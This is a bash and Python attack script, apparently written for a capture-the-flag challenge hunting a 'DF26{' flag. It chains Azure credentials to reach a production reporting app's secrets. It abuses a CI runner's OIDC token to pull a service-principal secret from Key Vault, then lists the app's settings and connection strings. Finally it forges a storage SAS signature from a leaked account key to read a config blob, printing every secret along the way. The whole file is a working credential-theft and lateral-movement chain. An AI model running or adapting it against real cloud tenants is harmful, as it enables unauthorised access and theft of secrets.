#!/usr/bin/env bash
# reporting-service-principal -> app-tbl-reporting-prod appsettings (CONFIG_STORAGE_CONNECTION) -> read flag blob.
set +e
SUB="$AZURE_SUBSCRIPTION_ID"; TEN="$AZURE_TENANT_ID"; RRG="rg-tbl-reporting-prod-eus"; APPR="app-tbl-reporting-prod"; AUD="api://AzureADTokenExchange"
mint(){ curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r .value; }
oidc(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer -d "client_assertion=$(mint)" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token; }
KVP=$(oidc)
RS=$(curl -s -H "Authorization: Bearer $KVP" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" | jq -r .value)
RA=$(echo "$RS"|jq -r .appId); RK=$(echo "$RS"|jq -r .clientSecret)
MG=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$RA" -d grant_type=client_credentials -d "client_secret=$RK" --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)
echo "### reporting-service mgmt token len=${#MG}"

echo "### app-tbl-reporting-prod APP SETTINGS:"
curl -s -X POST -H "Authorization: Bearer $MG" -H 'Content-Length: 0' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RRG/providers/Microsoft.Web/sites/$APPR/config/appsettings/list?api-version=2023-12-01" > /tmp/as.json
jq -r '.properties // {err:.error}' /tmp/as.json
echo "### connection strings:"
curl -s -X POST -H "Authorization: Bearer $MG" -H 'Content-Length: 0' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RRG/providers/Microsoft.Web/sites/$APPR/config/connectionstrings/list?api-version=2023-12-01" | jq -c '.properties // {err:.error.code}'

echo "### scan settings for flag + storage connection string, then READ the blob:"
python3 - <<'PY'
import json,re,base64,hmac,hashlib,urllib.parse,urllib.request
j=json.load(open('/tmp/as.json'))
props=j.get('properties',{}) or {}
for k,v in props.items():
    if 'DF26{' in str(v): print("FLAG IN SETTING",k,"=",v)
    print("SETTING",k,"=",v)
# find any storage connection string
conns=[v for v in props.values() if isinstance(v,str) and 'AccountKey=' in v]
# also build from AccountName/AccountKey pairs if split
for cs in conns:
    d=dict(p.split('=',1) for p in cs.split(';') if '=' in p)
    acct=d.get('AccountName'); key=d.get('AccountKey')
    if not acct or not key: continue
    print(f"\n>>> using connstring for account {acct}")
    sv="2021-08-06"
    sts="\n".join([acct,"rl","b","sco","2026-10-21T00:00:00Z","2026-10-24T00:00:00Z","","https",sv,""])+"\n"
    sig=base64.b64encode(hmac.new(base64.b64decode(key),sts.encode(),hashlib.sha256).digest()).decode()
    sas=urllib.parse.urlencode({"sv":sv,"ss":"b","srt":"sco","sp":"rl","st":"2026-10-21T00:00:00Z","se":"2026-10-24T00:00:00Z","spr":"https","sig":sig})
    def g(u):
        try:
            return urllib.request.urlopen(urllib.request.Request(u,headers={"x-ms-version":sv}),timeout=20).read().decode('utf-8','replace')
        except Exception as e:
            try: return e.read().decode('utf-8','replace')
            except: return str(e)
    print("  containers:", re.findall(r"<Name>([^<]+)</Name>", g(f"https://{acct}.blob.core.windows.net/?comp=list&{sas}")))
    print("  config blobs:", re.findall(r"<Name>([^<]+)</Name>", g(f"https://{acct}.blob.core.windows.net/config?restype=container&comp=list&{sas}")))
    body=g(f"https://{acct}.blob.core.windows.net/config/internal-config.json?{sas}")
    print("  >>> config/internal-config.json:\n", body)
PY
echo "=== DONE ==="
